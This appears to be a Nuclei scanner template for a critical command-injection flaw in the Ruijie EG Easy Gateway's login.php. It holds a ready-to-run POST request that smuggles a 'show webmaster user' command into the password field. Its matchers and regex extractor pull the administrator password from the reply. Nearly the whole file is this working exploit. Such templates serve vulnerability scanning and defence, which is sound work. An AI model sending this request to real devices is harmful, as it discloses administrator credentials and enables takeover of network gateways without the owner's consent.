id: ruijie-eg-login-rce

info:
  name: Ruijie EG Easy Gateway - Remote Command Execution
  author: xc
  severity: critical
  description: Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 1
  tags: ruijie,rce

http:
  - raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin?show+webmaster+user

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"data":'
          - '"status":1'
          - 'admin'
        condition: and
        part: body

      - type: word
        words:
          - 'text/json'
        part: header

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        group: 1
        regex:
          - 'admin ([a-zA-Z0-9#@]+)",'

